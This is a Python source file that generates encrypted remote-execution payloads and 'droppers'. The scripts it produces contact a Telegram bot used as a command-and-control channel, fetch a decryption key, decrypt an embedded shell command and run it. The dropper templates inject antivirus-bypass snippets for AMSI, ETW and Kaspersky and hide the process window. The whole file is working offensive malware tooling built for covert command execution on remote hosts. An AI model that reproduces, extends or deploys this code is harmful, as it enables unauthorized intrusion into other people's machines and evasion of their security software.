"""
payload_generator.py
=====================

Utilities to build encrypted Python payloads (and droppers) that fetch
their decryption key over Telegram. This module constructs self-contained
Python scripts (as strings) that will run on a remote host, poll a
Telegram bot for a base64 key, decrypt an encrypted command, and execute
it. The generator relies on an external `CryptoHandler` for symmetric
operations and `AVBypass` for optional bypass snippets used by droppers.

Notes:
- Templates are ASCII-only to avoid smart-quote issues when embedding
    into other systems.
- The generated scripts perform simple polling of the Telegram Bot API
    and attempt to be cross-platform (Windows / Unix) when spawning
    processes.
"""

import base64
import random
import string
import time
import os
import re
from core.crypto import CryptoHandler
from core.av_bypass import AVBypass

class PayloadGenerator:
    """Create a payload generator.

    Args:
        master_secret (bytes|str): Master secret for the CryptoHandler.
        salt (bytes|str): Salt used to derive per-key material.
        bot_token (str): Token for the control bot (not used in templates
            currently but kept for future features).
        payload_bot_token (str): Token used by generated payloads to
            communicate back to the operator via Telegram.
    """
    def __init__(self, master_secret, salt, bot_token, payload_bot_token):
        # Crypto handler responsible for key generation/encryption
        self.crypto = CryptoHandler(master_secret, salt)
        # AV bypass snippets provider (returns strings to inject)
        self.av_bypass = AVBypass()
        # Control bot tokens (kept as attributes so templates can embed them)
        self.bot_token = bot_token
        self.payload_bot_token = payload_bot_token

    def _prepare_payload(self, command):
                """Prepare an encrypted payload and register the key.

                Returns a tuple (encrypted_b64, key_id, key_bytes) where
                - encrypted_b64 is a base64-like string produced by the crypto
                    layer, suitable for embedding into the generated script
                - key_id is an identifier that the operator will use to send the
                    decryption key back to the payload
                - key is the raw key material (kept here so callers can persist
                    or transmit it to the operator out-of-band)
                """
                # Get a fresh symmetric key from the crypto handler
                key = self.crypto.get_current_key()
                # Encrypt the command with that key
                encrypted = self.crypto.encrypt_payload(command, key)
                # Create an identifier for the key and store the mapping
                key_id = self.crypto.generate_key_id()
                self.crypto.store_key(key_id, key)
                return encrypted, key_id, key

    def generate_payload(self, command, chat_id):
        """Generate a full Python payload script.

        The returned `script` is a string containing a self-sufficient
        Python program that when executed will poll the Telegram bot for
        the decryption key, decrypt the embedded command and execute it.

        Returns (script_string, key_id, key_bytes).
        """
        encrypted, key_id, key = self._prepare_payload(command)
        script = self._build_python_payload(encrypted, key_id, chat_id)
        return script, key_id, key

    def generate_dropper(self, command, chat_id):
        """Generate a dropper variant of the payload.

        Droppers include additional AV bypass snippets (AMS I, ETW,
        Kaspersky) injected into the top of the generated script.
        Returns (script_string, key_id, key_bytes).
        """
        encrypted, key_id, key = self._prepare_payload(command)
        script = self._build_python_dropper(encrypted, key_id, chat_id)
        return script, key_id, key

    def _build_python_payload(self, encrypted, key_id, chat_id):
        # Use repr() to produce a safe ASCII literal for embedding into
        # the Python template (handles quoting and escaping reliably).
        safe_encrypted = repr(encrypted)
        safe_key_id = repr(key_id)
        safe_payload_token = repr(self.payload_bot_token)
        safe_chat_id = repr(chat_id)

        # The template is a raw string so backslashes stay intact when
        # embedding into the generated payload. Placeholders are then
        # substituted using Python's % operator at the end.
        template = r'''
# -*- coding: utf-8 -*-
import base64
import json
import sys
import time
import urllib.request
import urllib.error
import subprocess
import platform
import os

PAYLOAD_TOKEN = %s
CHAT_ID = %s
KEY_ID = %s
ENCRYPTED = %s

# Allow overriding the Telegram API base URL via environment variable
# `TELEGRAM_API_BASE` (useful for local mock servers).
BASE_URL = os.environ.get('TELEGRAM_API_BASE', 'https://api.telegram.org')

def send_message(text):
    try:
        # Allow overriding the Telegram API base URL via environment
        # variable `TELEGRAM_API_BASE` (useful for local mock servers).
        BASE_URL = os.environ.get('TELEGRAM_API_BASE', 'https://api.telegram.org')
        url = f"{BASE_URL}/bot{PAYLOAD_TOKEN}/sendMessage"
        data = json.dumps({
            "chat_id": CHAT_ID,
            "text": text
        }).encode()
        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=10)
        return True
    except Exception as e:
        sys.stderr.write("[DEBUG] Send error: " + str(e) + "\\n")
        return False

def get_key():
    try:
        sys.stderr.write("[DEBUG] Sending /getkey_" + KEY_ID + "\\n")
        send_message("/getkey_" + KEY_ID)

        api_url = f"{BASE_URL}/bot{PAYLOAD_TOKEN}"
        offset = None

        for attempt in range(15):
            try:
                url = f"{api_url}/getUpdates?limit=1&timeout=0"
                if offset is not None:
                    url += f"&offset={offset}"

                sys.stderr.write("[DEBUG] Poll attempt " + str(attempt) + " (short poll)...\n")
                req = urllib.request.Request(url)
                try:
                    resp = urllib.request.urlopen(req, timeout=10)
                except urllib.error.HTTPError as e:
                    if e.code == 409:
                        time.sleep(0.5)
                        continue
                    raise
                data = json.loads(resp.read().decode())

                sys.stderr.write("[DEBUG] Got response\\n")

                if data.get('ok'):
                    for update in data.get('result', []):
                        offset = update['update_id'] + 1
                        msg = update.get('message', {})

                        if msg.get('chat', {}).get('id') == CHAT_ID:
                            text = msg.get('text', '')
                            sys.stderr.write("[DEBUG] Found message: " + text + "\\n")

                            if text and not text.startswith('/getkey_'):
                                sys.stderr.write("[DEBUG] Found key: " + text + "\\n")
                                return text
                else:
                    sys.stderr.write("[DEBUG] API error: " + str(data) + "\\n")
            except Exception as e:
                sys.stderr.write("[DEBUG] Poll error: " + str(e) + "\\n")
                continue

    except Exception as e:
        sys.stderr.write("[DEBUG] Outer error: " + str(e) + "\\n")
    return None

def decrypt(data, key):
    try:
        key_bytes = base64.b64decode(key)
        data_bytes = base64.b64decode(data)
        stretched = (key_bytes * (len(data_bytes) // len(key_bytes) + 1))[:len(data_bytes)]
        decrypted = bytes(a ^ b for a, b in zip(data_bytes, stretched))
        return decrypted.decode('utf-8')
    except Exception as e:
        sys.stderr.write("[DEBUG] Decrypt error: " + str(e) + "\\n")
        return None

def execute(command):
    try:
        sys.stderr.write("[DEBUG] Executing: " + command + "\\n")
        if platform.system() == 'Windows':
            proc = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
        else:
            proc = subprocess.Popen(
                command,
                shell=True,
                executable='/bin/sh',
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
        stdout, stderr = proc.communicate()
        if proc.returncode == 0:
            return stdout or "Executed successfully"
        else:
            return f"Error: {{stderr}}"
    except Exception as e:
        return f"Error: {{e}}"

def main():
    sys.stderr.write("[DEBUG] Starting payload...\\n")
    key = get_key()
    if not key:
        sys.stderr.write("[DEBUG] Failed to get key\\n")
        print("Failed to get key", file=sys.stderr)
        return
    sys.stderr.write("[DEBUG] Key obtained: " + key + "\\n")
    command = decrypt(ENCRYPTED, key)
    if command:
        sys.stderr.write("[DEBUG] Decrypted command: " + command + "\\n")
        result = execute(command)
        print(result)
    else:
        sys.stderr.write("[DEBUG] Decryption failed\\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
'''
        return template % (safe_payload_token, safe_chat_id, safe_key_id, safe_encrypted)

    def _build_python_dropper(self, encrypted, key_id, chat_id):
        # Fetch AV bypass code snippets (strings) from the AVBypass
        # provider. These are injected verbatim into the top of the
        # generated dropper script.
        amsi = self.av_bypass.get_amsi_bypass()
        etw = self.av_bypass.get_etw_bypass()
        kaspersky = self.av_bypass.get_kaspersky_bypass()

        # Make safe ASCII representations for embedding
        safe_encrypted = repr(encrypted)
        safe_key_id = repr(key_id)
        safe_payload_token = repr(self.payload_bot_token)
        safe_chat_id = repr(chat_id)

        # As above, use a raw template and substitute both the bypass
        # blocks and the safe literals.
        template = r'''
# -*- coding: utf-8;
{amsi}
{etw}
{kaspersky}

import base64
import json
import sys
import time
import urllib.request
import urllib.error
import subprocess
import platform
import os
import ctypes

PAYLOAD_TOKEN = %s
CHAT_ID = %s
KEY_ID = %s
ENCRYPTED = %s

# Allow overriding the Telegram API base URL via environment variable
# `TELEGRAM_API_BASE` (useful for local mock servers).
BASE_URL = os.environ.get('TELEGRAM_API_BASE', 'https://api.telegram.org')

def send_message(text):
    try:
        BASE_URL = os.environ.get('TELEGRAM_API_BASE', 'https://api.telegram.org')
        url = f"{BASE_URL}/bot{PAYLOAD_TOKEN}/sendMessage"
        data = json.dumps({
            "chat_id": CHAT_ID,
            "text": text
        }).encode()
        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=10)
        return True
    except Exception as e:
        sys.stderr.write("[DEBUG] Send error: " + str(e) + "\\n")
        return False

def get_key():
    try:
        sys.stderr.write("[DEBUG] Sending /getkey_" + KEY_ID + "\\n")
        send_message("/getkey_" + KEY_ID)

        api_url = f"{BASE_URL}/bot{PAYLOAD_TOKEN}"
        offset = None

        for attempt in range(15):
            try:
                url = f"{api_url}/getUpdates?limit=1&timeout=0"
                if offset is not None:
                    url += f"&offset={offset}"

                sys.stderr.write("[DEBUG] Poll attempt " + str(attempt) + " (short poll)...\n")
                req = urllib.request.Request(url)
                try:
                    resp = urllib.request.urlopen(req, timeout=10)
                except urllib.error.HTTPError as e:
                    if e.code == 409:
                        time.sleep(0.5)
                        continue
                    raise
                data = json.loads(resp.read().decode())

                if data.get('ok'):
                    for update in data.get('result', []):
                        offset = update['update_id'] + 1
                        msg = update.get('message', {})

                        if msg.get('chat', {}).get('id') == CHAT_ID:
                            text = msg.get('text', '')
                            sys.stderr.write("[DEBUG] Found message: " + text + "\\n")

                            if text and not text.startswith('/getkey_'):
                                sys.stderr.write("[DEBUG] Found key: " + text + "\\n")
                                return text
            except Exception as e:
                sys.stderr.write("[DEBUG] Poll error: " + str(e) + "\\n")
                continue

    except Exception as e:
        sys.stderr.write("[DEBUG] Outer error: " + str(e) + "\\n")
    return None

def decrypt(data, key):
    try:
        key_bytes = base64.b64decode(key)
        data_bytes = base64.b64decode(data)
        stretched = (key_bytes * (len(data_bytes) // len(key_bytes) + 1))[:len(data_bytes)]
        decrypted = bytes(a ^ b for a, b in zip(data_bytes, stretched))
        return decrypted.decode('utf-8')
    except Exception as e:
        sys.stderr.write("[DEBUG] Decrypt error: " + str(e) + "\\n")
        return None

def execute_fileless(command):
    try:
        sys.stderr.write("[DEBUG] Executing: " + command + "\\n")
        if platform.system() == 'Windows':
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0
            proc = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        else:
            proc = subprocess.Popen(
                command,
                shell=True,
                executable='/bin/sh',
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
        stdout, stderr = proc.communicate()
        if proc.returncode == 0:
            return stdout or "Executed successfully"
        else:
            return f"Error: {{stderr}}"
    except Exception as e:
        return f"Error: {{e}}"

def main():
    sys.stderr.write("[DEBUG] Starting dropper...\\n")
    key = get_key()
    if not key:
        sys.stderr.write("[DEBUG] Failed to get key\\n")
        return
    sys.stderr.write("[DEBUG] Key obtained: " + key + "\\n")
    command = decrypt(ENCRYPTED, key)
    if command:
        sys.stderr.write("[DEBUG] Decrypted command: " + command + "\\n")
        result = execute_fileless(command)
        print(result)
    else:
        sys.stderr.write("[DEBUG] Decryption failed\\n")

if __name__ == "__main__":
    try:
        main()
    except:
        pass
'''
        # Replace the named placeholders for bypass snippets first,
        # then interpolate the token/chat/key/encrypted values.
        return template.replace('{amsi}', amsi).replace('{etw}', etw).replace('{kaspersky}', kaspersky) % (
            safe_payload_token,
            safe_chat_id,
            safe_key_id,
            safe_encrypted
        )